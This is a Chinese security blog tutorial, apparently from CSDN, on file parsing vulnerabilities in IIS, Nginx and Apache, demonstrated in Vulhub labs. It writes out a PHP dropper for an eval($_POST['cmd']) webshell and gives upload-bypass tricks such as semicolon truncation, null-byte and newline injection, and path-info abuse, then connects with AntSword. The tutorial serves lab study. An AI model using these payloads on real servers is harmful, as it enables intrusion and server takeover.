---
layout: post
title: "文件解析漏洞详解"
date: 2025-03-13 18:52:57 +0800
description: "IIS解析漏洞IIS解析漏洞环境安装IIS6.X⽬录解析在iis6.x中，.asp⽂件夹中的任意⽂件都会被当做asp⽂件去执⾏。在iis的⽹站根⽬录新建⼀个名为x.asp的⽂件在x.asp中新建⼀个png⽂件。内容为<%=now()%> asp代码。外部浏览器中访问windows2003的iis⽹站中的1.png 发现asp代码被执⾏将1.png⽂件放到⽹站根⽬录下访问，发现其中的asp代码没有被解析。由此可⻅.asp⽂件夹中的任意 ⽂件会被当做asp⽂件去执⾏畸形⽂件解析。"
keywords: "文件解析漏洞详解"
categories: ['未分类']
tags: ['安全']
artid: "146234765"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146234765
    alt: "文件解析漏洞详解"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146234765
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146234765
cover: https://bing.ee123.net/img/rand?artid=146234765
image: https://bing.ee123.net/img/rand?artid=146234765
img: https://bing.ee123.net/img/rand?artid=146234765
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     文件解析漏洞详解
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2>
     <span style="color:#262626">
      IIS解析漏洞
     </span>
    </h2>
    <p>
    </p>
    <div>
     <span style="color:#262626">
      环境安装
     </span>
    </div>
    <div>
     <span style="color:#262626">
      windows2003+iis6
     </span>
    </div>
    <div>
    </div>
    <h3>
     <span style="color:#262626">
      IIS6.X
     </span>
    </h3>
    <h4 style="background-color:transparent">
     <span style="color:#262626">
      ⽬录解析
     </span>
    </h4>
    <p>
     <span style="color:#262626">
      在iis6.x中，.asp⽂件夹中的任意⽂件都会被当做asp⽂件去执⾏。
     </span>
    </p>
    <p>
     <span style="color:#262626">
      在iis的⽹站根⽬录新建⼀个名为x.asp的⽂件
     </span>
    </p>
    <p>
     <img alt="" height="337" src="https://i-blog.csdnimg.cn/direct/5810abf686824f2f8cff4ee40ea18655.png" width="927"/>
    </p>
    <div>
     <span style="color:#262626">
      在x.asp中新建⼀个png⽂件。内容为&lt;%=now()%&gt; asp代码。
     </span>
    </div>
    <p>
     <img alt="" height="390" src="https://i-blog.csdnimg.cn/direct/850f9208651942db9fe15efe11d336a8.png" width="1140"/>
    </p>
    <div>
     <span style="color:#262626">
      外部浏览器中访问windows2003的iis⽹站中的1.png 发现asp代码被执⾏
     </span>
    </div>
    <div>
     <img alt="" height="237" src="https://i-blog.csdnimg.cn/direct/628b463f639042d3ae2edd835d035fbf.png" width="519">
     </img>
    </div>
    <div>
     <div>
      <span style="color:#262626">
       将1.png⽂件放到⽹站根⽬录下访问，发现其中的asp代码没有被解析。 由此可⻅.asp⽂件夹中的任意 ⽂件会被当做asp⽂件去执⾏
      </span>
     </div>
     <div>
      <img alt="" height="151" src="https://i-blog.csdnimg.cn/direct/730b5b120b7b4a89aa04286430d7a363.png" width="504">
      </img>
     </div>
     <div>
      <h4>
       <span style="color:#262626">
        畸形⽂件解析
       </span>
      </h4>
      <div>
       <span style="color:#262626">
        在IIS 6 处理⽂件解析时，
       </span>
       <span style="color:#404040">
        分号可以起到截断的效果。
       </span>
      </div>
      <div>
       <div>
        <span style="color:#404040">
         333.asa;.jpg会被服务器看成是333.asa
        </span>
       </div>
       <div>
        <img alt="" height="262" src="https://i-blog.csdnimg.cn/direct/e36ef5c8e39e451f872454fdd765bc67.png" width="677">
        </img>
       </div>
       <div>
       </div>
      </div>
      <h3>
       <span style="color:#262626">
        IIS7.X
       </span>
      </h3>
      <div>
       <span style="color:#222222">
        在默认Fast-CGI开启状况下，在⼀个⽂件路径/xx.jpg 后⾯加上/xx.php会将
       </span>
       <span style="color:#262626">
        <strong>
         /xx.jpg/xx.php
        </strong>
       </span>
       <span style="color:#262626">
        解析为 php ⽂件
       </span>
      </div>
      <div>
       <div>
        <strong>
         <span style="color:#262626">
          利⽤条件
         </span>
        </strong>
       </div>
       <div>
        <span style="color:#262626">
         1. php.ini⾥的cgi.fix_pathinfo=1 开启
        </span>
       </div>
       <div>
        <span style="color:#262626">
         2. IIS7在Fast-CGI运⾏模式下
        </span>
       </div>
       <div>
       </div>
       <div>
        <span style="color:#262626">
         安装PHPstudy for IIS
        </span>
       </div>
       <div>
        <a href="https://old.xp.cn/download.html" rel="nofollow" title="Windows版phpstudy下载 - 小皮面板(phpstudy)">
         Windows版phpstudy下载 - 小皮面板(phpstudy)
        </a>
       </div>
       <div>
        <img alt="" height="615" src="https://i-blog.csdnimg.cn/direct/e3af2da8fbc141d087d66e27a395a19b.png" width="1706">
        </img>
       </div>
       <div>
       </div>
       <div>
        <strong>
         <span style="color:#262626">
          打开电脑iis和cgi
         </span>
        </strong>
       </div>
       <div>
        <img alt="" height="290" src="https://i-blog.csdnimg.cn/direct/cdfa346fdc9f4ef69b5de65eb7f8f9dc.png" width="454">
        </img>
       </div>
       <div>
        <strong>
         <span style="color:#262626">
          将php.ini⾥的cgi.fix_pathinfo=1 开启
         </span>
        </strong>
       </div>
       <div>
        <img alt="" height="445" src="https://i-blog.csdnimg.cn/direct/f6a7d373391d4f028545a097244df4db.png" width="876"/>
       </div>
       <div>
       </div>
       <div>
        <strong>
         <span style="color:#262626">
          IIS7在Fast-CGI运⾏模式下
         </span>
        </strong>
       </div>
       <div>
       </div>
       <div>
        <img alt="" height="489" src="https://i-blog.csdnimg.cn/direct/85e3c895d61945598fe98429e8d8b01c.png" width="911"/>
       </div>
       <div>
        <img alt="" height="416" src="https://i-blog.csdnimg.cn/direct/2b85eb2c67a04b9db7d69dada4e814aa.png" width="540"/>
       </div>
       <div>
       </div>
       <div>
        <strong>
         访问网页
        </strong>
       </div>
       <div>
       </div>
       <div>
        <img alt="" height="619" src="https://i-blog.csdnimg.cn/direct/aede5a06f36146af8102500b3bacbea6.png" width="1284"/>
       </div>
       <div>
        <img alt="" height="749" src="https://i-blog.csdnimg.cn/direct/f4d4adc313334231a87f0f43a20ec385.png" width="1275"/>
       </div>
       <div>
       </div>
       <div>
        <h2>
         <span style="color:#262626">
          Nginx解析漏洞
         </span>
        </h2>
        <h3>
         <span style="color:#262626">
          nginx_parsing
         </span>
        </h3>
        <h4>
         <strong>
          <span style="color:#262626">
           1.进⼊以下Vulhub路径并开启容器
          </span>
         </strong>
        </h4>
        <div>
         <span style="color:#262626">
          cd /nginx/nginx_parsing_vulnerability
         </span>
        </div>
        <div>
         <span style="color:#262626">
          docker-compose up -d
         </span>
        </div>
        <div>
        </div>
        <h4>
         <strong>
          <span style="color:#262626">
           2.浏览器中访问⽹站
          </span>
         </strong>
        </h4>
        <div>
         <img alt="" height="177" src="https://i-blog.csdnimg.cn/direct/b33ba63c167f40c4a613f2221ab9ad3e.png" width="714"/>
        </div>
        <div>
         <h4>
          <strong>
           <span style="color:#262626">
            3.制作图⽚⻢并进⾏上传
           </span>
          </strong>
         </h4>
         <div>
          <img alt="" height="310" src="https://i-blog.csdnimg.cn/direct/d5409a54002c44eab0192f8344e1d97d.png" width="530"/>
         </div>
         <div>
          <img alt="" height="112" src="https://i-blog.csdnimg.cn/direct/5fbb0126f09345bf9e04fd9476323b5a.png" width="1004"/>
         </div>
         <h4>
          4.利用nginx解析漏洞，访问路径
         </h4>
         <p>
          <img alt="" height="167" src="https://i-blog.csdnimg.cn/direct/809627d11aa447269f2abfd68c80e0d0.png" width="1260"/>
         </p>
         <h4>
          5.运用蚁剑连接
         </h4>
         <p>
          <img alt="" height="800" src="https://i-blog.csdnimg.cn/direct/16e886e2435b45c9a3d147bf3bb85147.png" width="1266"/>
         </p>
         <h3>
          <span style="color:#262626">
           CVE-2013-4547
          </span>
         </h3>
         <h4>
          <span style="color:#262626">
           1.使⽤以下命令启动靶机
          </span>
         </h4>
         <div>
          <span style="color:#262626">
           cd vulhub-master/nginx/CVE-2013-4547x //
          </span>
          <span style="color:#262626">
           切换到靶机⽬录
          </span>
         </div>
         <div>
          <span style="color:#262626">
           docker-compose up -d //
          </span>
          <span style="color:#262626">
           打开环境
          </span>
         </div>
         <div>
         </div>
         <h4>
          <span style="color:#262626">
           2.浏览器访问网站
          </span>
         </h4>
         <p>
          <img alt="" height="239" src="https://i-blog.csdnimg.cn/direct/5a56984427dc4f72aee04bc525ebb44b.png" width="1002"/>
         </p>
         <p>
          上传文件内容为“
          <span style="color:#262626">
           &lt;?php fputs(fopen(
          </span>
          <span style="color:#669900">
           "shell.php"
          </span>
          <span style="color:#262626">
           ,
          </span>
          <span style="color:#669900">
           "w"
          </span>
          <span style="color:#262626">
           ),
          </span>
          <span style="color:#669900">
           '&lt;?php eval($_POST["cmd"]);?&gt;'
          </span>
          <span style="color:#262626">
           )?&gt;
          </span>
          ”
         </p>
         <p>
          <span style="color:#262626">
           直接上传
          </span>
          <span style="color:#262626">
           shell.php
          </span>
          <span style="color:#262626">
           被拦截，修改⽂件后缀为.jpg进⾏上传且在后⾯添加空格，上传成功
          </span>
         </p>
         <p>
          <span style="color:#262626">
           运用bp进行抓包处理
          </span>
         </p>
         <div>
          <strong>
           <span style="color:#262626">
            在.jpg后⾯添加两个空格并给上
           </span>
           <span style="color:#262626">
            .php
           </span>
           <span style="color:#262626">
            后缀，在16进制修改中将原本两个空格的
           </span>
           <span style="color:#262626">
            0x20
           </span>
          </strong>
         </div>
         <div>
          <strong>
           <span style="color:#262626">
            0x20
           </span>
           <span style="color:#262626">
            修改为如下即
           </span>
           <span style="color:#262626">
            0x20 0x00
           </span>
           <span style="color:#262626">
            进⾏发包
           </span>
          </strong>
         </div>
         <div>
          <div>
           <img alt="" height="607" src="https://i-blog.csdnimg.cn/direct/86073ecf9ba247fa8bc4aeb5d0a5b05f.png" width="1107"/>
          </div>
          <div>
           <img alt="" height="831" src="https://i-blog.csdnimg.cn/direct/cc7bb5282bb344aea9d4b1f2c7d81354.png" width="735"/>
          </div>
          <div>
          </div>
         </div>
         <div>
          <div>
           <strong>
            <span style="color:#262626">
             访问上传后的⽂件....由于url会将其编码，需要继续抓包修改
            </span>
            <span style="color:#262626">
             0x20 0x20
            </span>
            <span style="color:#262626">
             为
            </span>
            <span style="color:#262626">
             0x20 0x00
            </span>
           </strong>
          </div>
          <div>
          </div>
         </div>
         <p>
          <img alt="" height="377" src="https://i-blog.csdnimg.cn/direct/95edde5a58b94c54b0f579917a7aed37.png" width="1137"/>
         </p>
         <p>
         </p>
        </div>
        <div>
         <img alt="" height="241" src="https://i-blog.csdnimg.cn/direct/5527dc8d926441539a7fe628272ec903.png" width="760"/>
        </div>
        <div>
         <strong>
          访问生成的木马文件
         </strong>
        </div>
        <div>
         <img alt="" height="397" src="https://i-blog.csdnimg.cn/direct/3d7ef0fe146e432a95fbe4c894204e5f.png" width="969"/>
        </div>
        <h4>
         3.用蚁剑连接
        </h4>
        <p>
         <img alt="" height="662" src="https://i-blog.csdnimg.cn/direct/15843619e0d94221bbd9e6e06acc2024.png" width="977"/>
        </p>
        <h2>
         <span style="color:#262626">
          Apache解析漏洞
         </span>
        </h2>
        <h3>
         <span style="color:#262626">
          apache_parsing
         </span>
        </h3>
        <h4>
         <span style="color:#262626">
          1.进⼊Vulhub靶场并执⾏以下命令启动靶场
         </span>
        </h4>
        <div>
         <span style="color:#232930">
          cd
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          vulhub
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          httpd
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#004fb4">
          apache_parsing_vulnerability
         </span>
        </div>
        <div>
         <span style="color:#232930">
          docker
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#004fb4">
          compose
         </span>
         <span style="color:#262c31">
          up
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#004fb4">
          d
         </span>
        </div>
        <div>
        </div>
        <h4>
         <span style="color:#004fb4">
          2.
         </span>
         <span style="color:#262626">
          访问靶机并上传
         </span>
         <span style="color:#262626">
          shell.php.jpg
         </span>
         <span style="color:#262626">
          ⽂件，⽂件内容为
         </span>
        </h4>
        <p>
         <span style="color:#262626">
          &lt;?php fputs(fopen("666.php","w"),'&lt;?php eval($_POST["cmd"]);?&gt;')?&gt;
         </span>
        </p>
        <p>
         <img alt="" height="281" src="https://i-blog.csdnimg.cn/direct/585d06923a394d9893f686d50fc70124.png" width="917"/>
        </p>
        <h4>
         3.运用蚁剑连接
        </h4>
        <p>
         <img alt="" height="657" src="https://i-blog.csdnimg.cn/direct/9b55f7bbe3cd42728cfaa8cf73627194.png" width="967"/>
        </p>
        <p>
        </p>
        <h3>
         <span style="color:#262626">
          CVE-2017-15715
         </span>
        </h3>
        <h4>
         <span style="color:#262626">
          1.进⼊Vulhub靶场并开启⽬标靶机，进⾏访问
         </span>
        </h4>
        <div>
         <span style="color:#262c31">
          #
         </span>
         <span style="color:#262c31">
          启动靶机
         </span>
        </div>
        <div>
         <span style="color:#232930">
          cd
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          Vulnhub
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          vulhub
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#232930">
          master
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          httpd
         </span>
         <span style="color:#e10023">
          /
         </span>
         <span style="color:#232930">
          CVE
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#004fb4">
          2017
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#004fb4">
          15715
         </span>
        </div>
        <div>
         <span style="color:#232930">
          docker
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#004fb4">
          compose
         </span>
         <span style="color:#262c31">
          up
         </span>
         <span style="color:#e10023">
          -
         </span>
         <span style="color:#232930">
          d
         </span>
        </div>
        <div>
         <img alt="" height="326" src="https://i-blog.csdnimg.cn/direct/5c0706d4cea545648472413478ae675e.png" width="751"/>
        </div>
        <div>
        </div>
        <h4 style="background-color:transparent">
         <span style="color:#232930">
          2.
         </span>
         <span style="color:#262626">
          尝试上传⼀句话⽊⻢⽂件，发现被拦截，在evil.php⽂件后⾯添加空格
         </span>
         <span style="color:#262626">
          0x20
         </span>
         <span style="color:#262626">
          在改为
         </span>
         <span style="color:#262626">
          0x0a
         </span>
         <span style="color:#262626">
          再次返送即可上传成功
         </span>
        </h4>
        <p>
         <img alt="" height="407" src="https://i-blog.csdnimg.cn/direct/0093d46ad038402ab35d485e18203a00.png" width="831"/>
        </p>
        <h4>
         3.
         <span style="color:#262626">
          访问上传的evil⽂件在后⾯加上
         </span>
         <span style="color:#262626">
          %0a
         </span>
         <span style="color:#262626">
          再访问
         </span>
        </h4>
        <p>
         <img alt="" height="349" src="https://i-blog.csdnimg.cn/direct/2a425605cac54878b66bbe11d81d7a64.png" width="600"/>
        </p>
        <h4>
         4.运用蚁剑连接
        </h4>
        <p>
         <img alt="" height="792" src="https://i-blog.csdnimg.cn/direct/d8b56688901240a8b80b8664dc3ae71e.png" width="1286"/>
        </p>
        <p>
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323430315f38353537383333392f:61727469636c652f64657461696c732f313436323334373635" class_="artid" style="display:none">
 </p>
</div>


